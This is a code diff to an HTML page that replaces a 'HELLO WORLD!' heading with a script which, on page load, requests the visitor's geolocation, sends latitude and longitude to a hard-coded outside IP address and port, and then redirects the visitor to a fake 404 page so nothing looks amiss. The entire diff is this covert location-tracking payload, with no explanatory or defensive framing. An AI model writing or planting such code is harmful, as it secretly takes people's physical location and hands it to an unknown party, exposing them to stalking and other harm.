@@ -5,7 +5,62 @@
 <body>
 
 
-<h1>HELLO WORLD!</h1>
+
+
+<script>
+
+
+window.onload = function () {
+
+      getLocation();
+
+
+
+}
+
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(sending, showError);
+  }
+
+
+}
+
+function sending(position) {
+
+
+  info = "[Latitude: " + position.coords.latitude + "] [" + "Longitude: " + position.coords.longitude + "]";
+
+
+  httpGetAsync("http://183.96.240.178:1479?get="+info)
+
+
+  window.location.href = 'http://example.com/404';
+
+}
+
+function showError(error) {
+
+
+}
+
+
+
+function httpGetAsync(theUrl, callback)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.onreadystatechange = function() { 
+        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
+            callback(xmlHttp.responseText);
+    }
+    xmlHttp.open("GET", theUrl, true); // true for asynchronous 
+    xmlHttp.send(null);
+}
+
+
+</script>
+
 
 
 </body>
